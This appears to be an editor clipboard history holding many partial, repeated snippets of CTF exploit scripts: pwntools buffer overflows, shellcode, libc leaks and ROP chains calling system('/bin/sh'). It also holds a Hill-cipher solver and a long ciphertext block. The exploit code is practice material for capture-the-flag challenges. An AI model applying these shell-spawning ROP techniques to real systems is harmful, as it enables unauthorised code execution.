be5ccc1bb7928fcc552ec939c6e89780|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|37|21|v|python
	0x000000000040091c
596d9fa7755c004478d409482f9971aa|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|52|1|V|python
	payload += b"B" * 8
9dc2964cf5635b1e696a7ac3bc277036|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|52|1|V|python
	payload += shellcode()
7fc7944c2e11e618e0335e7b6a89e12d|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|54|1|V|python
	payload += p64(RET_ADDR)
03f0a5443a3d0990843a31f04e6b6b63|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|55|12|v|python
	p64(RET_ADDR)
ffb1f7e39b667c92eb400b75b451f3cd|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|53|1|V|python
	payload += b"A" * (OFFSET - len(shellcode))
7664ae2d7e288a740f501db3c0d4c509|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|54|25|v|python
	 - len(shellcode))
d2913731286a0e5019d30d9474838969|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|50|7|v|python
	shellcode
ecd3e1f860317d6592c4fd13c5299648|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|49|1|V|python
	shellcode = asm(shellcraft.sh())
6edce16260d73ab4e8bb1765606eb440|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|49|1|V|python
	print(len(shellcode))
fdc2f738127fded71939ae3e9dede549|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|52|1|V|python
	# payload += b"A" * (OFFSET - len(shellcode))
bf8359573d7711bbf37af8cf19a01acc|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|51|1|V|python
	payload = shellcode
972adedc28a286f80b17889f6ec5712a|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|48|1|V|python
	RET_ADDR = 0x7fffffffdd4
660ddf477e9a1be95e79e49f28aa931b|file:///home/neo/CTFs/ccsc2020/easy_as_PIE/pie/exploit.py|81|1|V|python
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
	FFLUSH_GOT = BINARY_BASE_ADDR + exe.got["fflush"]
	PUTS_GOT = BINARY_BASE_ADDR + exe.got["puts"]
48c1a97934562efd12f6ea0723bec6b2|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|50|1|V|python
	FFLUSH_GOT = BINARY_BASE_ADDR + exe.got["fflush"]
3cc5381fb69dfd32338b49b9babd3129|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|49|14|v|python
	BINARY_BASE_ADDR +
7c3491c67b82f9ab98c5f5dfe9a94d19|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|50|12|v|python
	NARY_BASE_ADDR +
be8f33289731e815d8083cae3d736c7b|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|54|1|V|python
	# payload += p64(RET_ADDR)
c742aa5110cf672ed16513ae23edca9c|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|67|1|V|python
	print(line[-8:])
084597ccb1604402b124678f5d05aa56|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|66|1|V|python
	line = io.recvline()
	line = io.recvline()
	line = io.recvline()
bd3043ce5a122a6b7936a117f02d8f63|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|63|1|V|python
	payload+= p64(MAIN_ADDR)
684fc0beb93475b378b376c605b915c7|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|48|4|v|python
	recvuntil
021b61b275c350f4893273ccc2eeb799|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|48|1|V|python
	io.re("name: ")
7a5d56f854c770cbd354ccb4b57e0ec7|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|63|1|V|python
	log.info('Received %s' % line)
1b28e379a7dd666370cd1f84972b4cf1|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|69|1|V|python
	line = io.recv()
	log.info('Received: %s' % line)
498c381ba18fc1be2160719e3e0a7c45|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|70|30|v|python
	weird
21246b08dc5a2ecd2ef3836b55d7af3b|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|72|1|V|python
	log.info('Received: %s' % line)
5a59dd6e51d0ff75e8f29b4fcfd53ed4|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|74|1|V|python
	PUTS_LIBC = u64()
44efedf93c8623d091c529760e3609d9|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|70|1|V|python
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
56ab24c15b72a457069c5ea42fcfc640|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|75|30|v|python
	happy
0adfff1ab053cc4ec19994aec6b33fd1|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|78|11|v|python
	Puts
d1af44e50148ed05dd11945854a040cf|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|55|1|V|python
	SYSTEM_ADDR = exe.sym.system
d1f672039ff343fb5bd5ea467952c331|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|69|15|v|python
	libc6_2
d407caefecd00c8abbec7f4e35ce0425|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|69|13|v|python
	./.27-3ubuntu1_amd64.so
48de7f9687e7baad2cdb7f2ff45a7382|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|69|1|V|python
	libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc.so.6')
7ab102b9e73a19f0e512eff6410cb50d|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|70|23|v|python
	27-3ubuntu1_amd64/libc.so.6
b3cbeece8c12da146daf28a4b402cd80|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|70|15|v|python
	libc6_23
8b00f7031739e296f83320bb55accca1|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|72|1|V|python
	libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
3cd5dd33c6e5751a42fbdece4c763267|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|71|41|v|python
	libc.so.6
f844bbcf5e530c134af117abd5a03611|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|57|14|v|python
	rop.find_gadget(["ret"]).address
bbd02bdf629877b4f76df04b55e00b79|file:///home/neo/ropemporium/split/exploit.py|44|1|V|python
	CAT_FLAG_ADDR = next(exe.search('/bin/cat flag.txt'))
8ff57cab1d41f0316613ea26c7dfe02e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|78|12|v|python
	b"/bin/sh\x00"
3d7011fb433d7c5b529263375c55fc58|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|75|1|V|python
	print(exe.search('/bin/sh'))
73e74a8d031cb95c1edd986be2d3814e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|76|1|V|python
	BINSH_ADDR = 0x001b6613
09ad2e7ab7770f11619198bfcd8f1a2f|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|75|1|V|python
	libcs = libc.search
162ac59f2ea94fb3dd2a9f7f450aa256|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|75|1|V|python
	print(libc.search('/bin/sh'))
215912767a501b80e949187f61786afc|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|76|1|V|python
	print(BINSH_ADDR)
cf3be6026fa1de17a6b7e6a7e00d7e96|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|76|1|V|python
	log.info("/bin/sh addr: %#x" % BINSH_ADDR)
53ccef1cb9c82efa6c8431651d2f0ff5|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|78|18|V|python
	payload += p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
	
	io.sendline(payload)
3554b14e3971130f2725d908f97e7136|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|74|1|V|python
	PRINTF_ADDR = 0x7f624a560e80
bee03311bda32a4226bc9a9f6fce48af|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|79|1|V|python
	BINSH_ADDR = 0x7ffff7f63613
5561cd547dca9c6efadb46fea6304ecd|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|44|31|v|python
	*0x000000000040091c
c0a6bfdaeabfa55bc132903f893a9ec7|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|44|5|v|python
	piebase
e0414586250e9ee0f9371d6b2b11caf3|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|77|1|V|python
	log.info("libc base: %#x" % LIBC_BASE)
b929a8728d5d0adc0e211e7488e12e1d|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|75|1|V|python
	PRINTF_ADDR = 0x7f0bec7ded70
b42b3ae1decafa594f83af4a399c1ffe|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|74|1|V|python
	# PRINTF_ADDR = 0x7f624a560e80
	PRINTF_ADDR = 0x7f9d121b2d70
e279249cfdfe0af3486a2415f66d62b4|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|73|1|V|python
	# libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc-2.27.so')
	libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
	LIBC_BASE = PRINTF_ADDR - libc.sym.printf
	log.info("libc base: %#x" % LIBC_BASE)
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("System addr: %#x" % SYSTEM_ADDR)
	BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
	log.info("/bin/sh addr: %#x" % BINSH_ADDR)
	
	payload += p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
	
	io.sendline(payload)
6445f965fd0e8d4935c98b33c5043629|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|94|1|V|python
	payload += p64(POP_RDI)
839f111fa9e1c22ef70be3130ec0bfdf|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|87|1|V|python
	LIBC_BASE = PRINTF_ADDR - libc.sym.printf
11703795eaad8539633cbfe4b78ca9e6|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|87|1|V|python
	# LIBC_BASE = PRINTF_ADDR - libc.sym.printf
c0e43d407a410b3e4467fb900d346939|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|95|1|V|python
	payload = p64(POP_RDI)
12075f629ed63ba04c48ea22f22bd20e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|94|1|V|python
	payload += p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
	io.sendline(payload)
cbe359ddeef1cb0038ada04987cac1b5|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|94|1|V|python
	# payload2 = p64(POP_RDI)
	# payload2 += p64(BINSH_ADDR)
	# payload2 += p64(RET_GADGET)
	# payload2 += p64(SYSTEM_ADDR)
	# io.sendline(payload2)
8f13222e0d58c34552ee799c5407bc1e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|73|1|V|python
	io.sendline(p64(MAIN_ADDR))
144bdfd66a37a2819f8886a6ec135421|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|99|1|V|python
	io.send(payload)
0d9b9555d98fe82be10a014c66e33617|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|85|13|V|python
	io.recvline()
	io.sendline(p64(MAIN_ADDR))
d0b7227de3655502248adac69b70da3b|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|85|1|V|python
	# libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc-2.27.so')
	# libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
	# LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	# log.info("libc base: %#x" % LIBC_BASE)
	# SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	# log.info("System addr: %#x" % SYSTEM_ADDR)
	# BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
	# log.info("/bin/sh addr: %#x" % BINSH_ADDR)
	
	# payload = p64(POP_RDI)
	# payload += p64(BINSH_ADDR)
	# payload += p64(RET_GADGET)
	# payload += p64(SYSTEM_ADDR)
	# io.sendline(payload)
	
339db18683f50667ad897975c8cdbd3c|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|80|1|V|python
	# BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
8e5831b47becbe406ac383850a470ecf|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|76|13|v|python
	PRINTF_ADDR
39443137e63ce6dc8a04843f37866082|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|73|1|V|python
	
	# libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc-2.27.so')
	libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
	LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	log.info("libc base: %#x" % LIBC_BASE)
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("System addr: %#x" % SYSTEM_ADDR)
	BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
	log.info("/bin/sh addr: %#x" % BINSH_ADDR)
	
	payload = p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
	
	io.sendline(payload)
6a9aa2d6a500c145d34226bee5b8bbdc|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|72|1|V|python
	io.sendline(payload)
	
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
8052a9e512e618cf423432e95a479db6|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|79|1|V|python
	print(io.recvline())
6720e3adf297a7254fafb32af45adb03|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|79|1|V|python
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
c6a34f6592af492ecd5decb2ba979e44|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|82|1|V|python
	line = io.recvline(False).ljust(8, b'\x00')
7fbdf77848909a70e6aa2dba47d5cfdd|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|83|21|v|python
	.ljust(8, b'\x00')
2d78fbd271675ac9d0adac5adff78cfb|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|73|1|V|python
	# payload += p64(POP_RDI)
f3d51f2eed66d0c7421cd4079e4aded7|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|68|1|V|python
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
	
3aeb6d86cebd8ba756c8814e6d67ea7d|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|56|1|V|python
	# RET_GADGET = rop.find_gadget(["ret"]).address
f93716ca4ec9e5c4986064660026a2be|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|80|1|V|python
	line = io.recvline_contains("weird")
33fdc6177a009fb0fb97fe5b0c8a269a|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|69|1|V|python
	# payload += p64(MAIN_ADDR)
b2e27cabb6f357f7239685fa64ba9bed|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|66|1|V|python
	payload += p64(EAT)
18b9ccb15c8f7addeb14bb4ec3bb8943|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|51|1|V|python
	print("EAT: %#x" % EAT)
077071c3537e01033d6fda34115b1191|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|68|11|V|python
	payload += p64(EAT)
	payload += p64(SLEEP)
c3bbad2664fc0606aa866b1570e4ed78|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|80|1|V|python
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
	
	line = io.recvline_contains("weird")
	io.recvline()
	line = io.recvline().ljust(8, b'\x00')
	PRINTF_LIBC = u64(line)
	log.info('Printf@libc: %#x' % PRINTF_LIBC)
dde1ca82c12b07582104ce048b1bb5d8|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|71|1|V|python
	io.send
657d3a65201f9739b2bba3b0273fa4a2|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|82|1|V|python
	print(io.recvline())
	print(io.recvline())
fd32b7e7e6a533a5bdd000bbdd5afde3|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|84|1|V|python
	# line = io.recvline_contains("weird")
e0d33b41e42ffbbc6c3df08a83d6f454|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|86|1|V|python
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	print(io.recvline())
	line = io.recvline().ljust(8, b'\x00')
db268a63f96d15e8fc3045769b4ca5bb|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|85|1|V|python
	line = io.recvline_contains("happy")
f28f9b3263453f9309c488cb8226345e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|88|1|V|python
	# print(io.recvline())
ff62bf7803e5285e476217b0c8de9087|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|92|1|V|python
	print(line1)
ef54d747b37f5c6d32ac466c9d719054|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|90|1|V|python
	line2 = io.recvline()
46e753b56b380680eff666b11958da6d|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|93|1|V|python
	print(line2)
971e65ccfd815b6c54ee4be5afa6d04e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|68|1|V|python
	payload += p64(EAT)
	payload += p64(SLEEP)
	payload += p64(MAIN_ADDR)
cf3dceefa914017175b1a46e1ab16f9e|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|88|1|V|python
	# print(io.recvline())
	# print(io.recvline())
	# print(io.recvline())
	io.recvline()
	line1 = io.recvline()
	line2 = io.recvline()
	line3 = io.recvline()
	print(line1)
	print(line2)
	print(line3)
f4fcbd8a36ecede3f9fbd0d8a0e827eb|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|88|1|V|python
	# line = io.recvline(False)[:8].ljust(8,b'\x00')
6aa890b0a246b47265c4256c32977a74|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|73|1|V|python
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
f086f90eb395bd023fb6d00473073b60|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|88|1|V|python
	# print(line)
cab921890c7b392a59f55de572b3b460|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|52|1|V|python
	print("SLEEP: %#x" % SLEEP)
e8001d35b05dcf2a1df824202318122b|file:///home/neo/CTFs/hsctf/pwnagotchi/exploit.py|62|1|V|python
	payload = b"A" * OFFSET
30995a294e4d999d078b2b77fa69c003|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|1|1|V|python
	from sympy import Matrix
	import numpy as np
f3a56d915511b3858dfa6d49db08a06f|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|20|1|V|python
	ct_matrix = np.array(ct_matrix)
e2874ab52cf4d9e053b05c85757b7bbd|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|21|1|V|python
	
	print(np.linalg.det(key_matrix) % 26)
	print("Calculating inverse key matrix")
	inverse_key = Matrix(key_matrix).inv_mod(26)
	# inverse_key = np.array(inverse_key) #sympy to numpy
	# inverse_key = inverse_key.astype(float)
	
	decryption = np.matmul(ct_matrix, inverse_key)
	decryption = np.remainder(decryption, 26).flatten()
	print(decryption)
503d2748d8d75be28e792b76d8124c5f|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|12|1|V|python
	F = GF(26)
cd14c5f2aa572f812b39f14516ea86cc|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|22|1|V|python
	print(key_inverse)
dbc478c5678ebc377d652ebc96dcb25e|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|23|1|V|python
	print(pt_matrix)
0798ac7838ca54760c5bf1fc263d5238|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|26|9|V|python
	        print(b)
b0322c50071e5aff7c77ce64c69ec4a8|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|27|9|V|python
	        print(b+ ord('a'))
da095cf87f684378242724388d694a33|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|23|1|V|python
	print(key_inverse * key_matrix)
a112600b2a6dfe4b4d766c9e189e059a|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|25|1|V|python
	# for a in pt_matrix:
	#     line = ''
	#     for b in a:
	#         line += chr(int(b) + ord('a'))
ee65159735c95d8c384d6e1e6321e33e|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|27|5|V|python
	    line = ''
791b1612f672ad131a376c09465e1f7b|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|27|10|v|python
	pt_matrix
b179ff9a3ead3d50bcbb57c08a7bb9e7|file:///home/neo/CTFs/hsctf/xkcd/solve.sage|24|10|V|python
	new_ct = key_matrix * pt_matrix
	
	test = ''
	for a in new_ct:
	    for b in a:
	        test += chr(int(b) + ord('a'))
	print(test)
e0b7838407aad7cc657b2307ba150be5|file:///home/neo/CTFs/hsctf/xkcd/pt.txt|1|1|V|text
	ncdhtnnqrqxnycaiakzeidhqqjffyylgqdtfdfutquzjmfdquovgphxennejtjinuhmssigpareqhfsagcmgsxfsdqwgntmnsplc
	emnutlnpoaejvwnvmtybjbucassthuvyevkpgjlcxhkbprognrvfehfuugllfvpskivtzfudwkropahbqxqwasamkkhgipbmihei
	bcojduvxvnqjlybglpgzsshxyinkjpswbzosgrppdyrvlxrcuochxqcffoxvqkmgshlvmisijeiztqyxzblumistabbnjcymatjw
	msjipeybxkbyzgzkseslkjdevtmcoydrvpylcxsewvartntvpiaonsyjnmyedntksbmgkjwakbkmjmdgqpqbmvepyiskzexlrrff
	obmcntcmhzteaifribhufaqenudgmkzrzirlfnduahlwzhobiycructaswqyxebwxgskgrvecsbasunudvoeskgekwjqlbudicck
	yfwtfrpxgpowdjmzmhuxyuuawvqrdiehaokzlvbfsgroxfkjhoqjzmdxbskrmtokwwyjltttnfsryewqdjxlbyojqreixmwjgbes
	chriuzqjdnpxdwunmklkdsxedkgfwdspsciwpsgmdigwlmvpwphoetnuzhvneigdoibwvlicqgmiaapsalkvnlrgfmvbadmpnjab
	katkxhulkdtmnrnhbudrjfcdtctwamkwcmjygjkdrfxrgafjqfoufbnjbvcyxynztwwjyxskxrfxvjeiqixtomrkqdbvxwdkrjuv
	vdivovnmjyzulngvoxupphdnfzznhfdpvbxvdjhaifenvgsawuuremcffkjteddbolxjxuywbyrbcvktdesjfcejnjnjupredxwr
	tiqxqmiolbqbtfrzistitqdhycalocfqijmujcidkivtjlyvntpujmurkqaeoqvjdufmpvtedksbyfrfmzrmrmowrpipcnmxbykj
	wffgmlnsknrxzcvcftgzcialvypajwrmgrjgdozhrlrfgkovblszoejnbvcbkkocbuepciyepfkdnfefdxzjztapbidshxsqvmuq
	fjjwbaqkmfbqxqdvvciowltkbgxvklmzkatlckipvzzhbkddtempafkgfdwpsquadimbejryrnxuiiwqqfklspxqldjemfprgxbx
	przomkrqzfkpqshtdwqocyivlyyzjwycwhiwukjafzngzofglzjhoelxykmktzjijkxssimuefjvsbmgyzixyhfpviuonruvuroo
	wgtkbqkwuuxtckboxsxbbsttyvbatfxjyvbflfxcunozoftdoooopkiemfhvgpkawrhqedunstntfwrfmeghlukwvneyokcliotx
	xmhcwacueafuoaukxxoxyfgrtzctrkigfbqfflhrvybjjhbxfauepoglhzfkfdjrefskcygthpbnsfwpkittzpfeaivochujxmsa
	srjkwpmdipesdbtdjwldumbeyimnfglnvvlrwslntuinradtfbsbsakgikrykfatpnxacdavovehedeosgmxcrlodrysdohthmtf
	ceiehfwphizbtemubxpsixfbebzncwawnosndkxluhgcrnnruqhrpwjdzcxbzpawrkkkchaurfsstzskzvqcwrkanczvjkomncwa
	usiwgqueyfvmashhhkreesnfuibgmiemuwkhhvglywvkhblanloyqbglqvbowwiimqexqsrwcxbitixabayitgynzfqwdumlfsbi
	dyqvuabmyeiyymvsgyjamdpsfjeyccmnqnrbtulvxhcfstvmieghsvuypfwrfbklzaczaqltvdcmksjqqknbmvjktzjdhgvfheax
	hdwdjlddrwenkcfcfiqqxuqwdmmqwwwxbghweeyxxnebnpprjfahiequjdyvyzijnapdwmynkjfllzdqaojyzdbilgqtfbvftnce
	egzhlqxsuyypxzrhftufhyapfrmkyqasycbykwhsizfjgliafdwuwvozuwaeqwlynackhoufvyxrpcsoiyupwkegwuagqavtddub
	tssdczautvpivkxetklbjtjahdzatbzobobmfrwnpqljtuczsaetpaegjsvsbklqqqmmqhnhwydeykrrecjhuuiicoaovvqqubwc
	imkqrpnkehqdsbpoosfbekawpymsrxiguusulbjiffxqhsbrolvsvbbkahhnmeuyzistyelxnlyoimmkjorvpevqlaacvhbhonpp
	wfqguyxevbylsxsxgksnqzlmzsnqlmvdhiehywufpqgbgihxfzekgwykogrqwnhdzyzowcxjlxpguzoacxfezgplsnhhapcynfza
	mcyikfrhcjvuydghpdplcxpiouehwjuwxdwketbjpqhlpsfoipifaywiydfqxsvhdnhtmmyktqcsqteupsmenxgczzacjypxfdhe
	payawhcvzhaycnlmrkbupvwyxcbroqnmgueljjylpolpswumnruhopxgumtzytiwxofckicnrjfsgsnhvcihfnejzkrhrikbaufe
	zideuwwvwzmcywzownkdrmygrepzlztzlyammwqjkqqwyxvksiifqhqnjanczbipgwionxrhzkebrsnelotjwcvsiolbuzhypboq
	gsopzyjrwyiuebzvedurrxdhxjnspmxicplinqmlnptcwqpvpgcdduqkhkzyvgnvxrhgaocwcsvmxteumcvmtpfjyewvnkcerjwf
	gumljcsxtmiekutxdqljoxgzxzikudtxfevbscbtfshzljrvxxfiohmnajsshpuuzsocmhyhvwztyxheobyqctkklqbecrdwuoru
	cjavfaibicqhbakpitkbxqdnkhkydgpuhnsbwqjueftxjhqpjcijuueuvaeqlsalsdiglwjjfgsguznpjfilfoxswcbjhtwcztog
	azxnrwbhaldzvzowypgulannnjcndvrufmlqhoclywtgprruyrqnnzunxwfuxttotcvjuxvuhgwlmovuzijgtjwpkrcidptmpdvu
	yftlfjukgkgoywmlkpmhfrxvkoxpcegzoblzwvgsdzdfoxxqlrjheohookyfurwxtymibynzaltdlmypeygthjsvgqdfnsdhmrxr
	qkzlklmfhnhqsyjzvpcnlmtqnwwaedcsqmspsjlrmstzqjelhfkwepsrmklyqguwmyslvtulxgmyghffqkiluquvvrazlvzkzefe
	kvmhscdjmhbkmhndguytvwwuihiipyzibzexnfmmzmmkxzmogivpgttjwsgblokdqshwpetpypyctkviqfmqxbwczvuxuowagely
	dgaufzrxizvuuvhwusxyixsoriowmxzmynrludxcooljdetdvtllpeltsqvpmsatjmbwgfaacqhegeqthufxgfszycxfxklapnpg
	uklkcvqnkqolbjajmrzbmkuekgnsgbbpcvsdhtnddydmikiliyrmewkhqqovqzvokttvriiaqvsnqoaaymkbcxbghkqhaabtubti
	vednotpcjyfikltwrpavpphcdbsuemgxgvthajsoetghmgqerjpaygmfycfwraybasatzhoitvzvyuyzvatpwxlmsdhzjkqrlkre
	zbtujcwtbrmpiatuidsgveoofmddevlxcelgwcbbftffswsaqywwykpyfdssakyrixzxmsttcomjxvevkqvaitbnztlioeygdosz
	onscnmsxerpwomzdfqhkleerdiuiygevaybzznipqxkpkqnrvmeeiorzcvzadgsgawuwghtbmuckpexjtnoeydxuilonunirrmqk
	wbvhknyufyohwtjnziwgtponnfzmykggemsqxgfhvaxdtcnfltpgjrtiqyzwaohhxhaoneihiworccwdftwuhqilsfsghlmmqhhk
	bdaqevzrkjgsfxdymufrsujhmdrbicloverexdrdsrufblhjefuajrkgkrmczzucbdxqyfyrmjexslemdypkcgybibfxrszeujzi
	difypkftruxjxtaondksuwtipsexqzbqsyzujgezkfkwmtuuuobveiwxpwgykkitzhtfsrrzldginpzocxgoecohzzknkfbzvbat
	mnrykzkzawyqlzwthczozyappbppuhzezkqwmfytyaulpzsmeuoyqxmvcttsavnspifyonjsobwbqiabogectwjvosivarpauzuz
	pntfbnibktwhaxrzcfiihlbnimthbshixnjbutlzdtymrrkdohqaqhlknmopiiyuaknpnojuyaurfsqzrjlqolbsyhbpcangqjto
	hsswgmeqswusxdksyfcleqjagippwcnwtehbapsfeqkbwvupjmuvyoxpqrvkgfaruoxqrreztwjeysomengxnznsaqxfblxurxxj
	arxnugeapddfhtqdkfhmgmjtzdqknnockzvgmntzewoehqojevpbwafysuvbzovwzrqpjvdeilcqafreymgyqeliugtwjogwfrku
	vwvjdvvcdayepicasotcyeykykqopkyffcyaosucxpeoxzwmdcpqsfygmdfdkcpdkuhmxidcodqqgthcqcidwafbewgdowzdanef
	odhgtjjnungllxtdikvjfmwhzjuydhobqqocdzuwuusxwzslekempmodvcaimtdpqhscudxijxwkqkmkbzwhqevqtnasudyfznjf
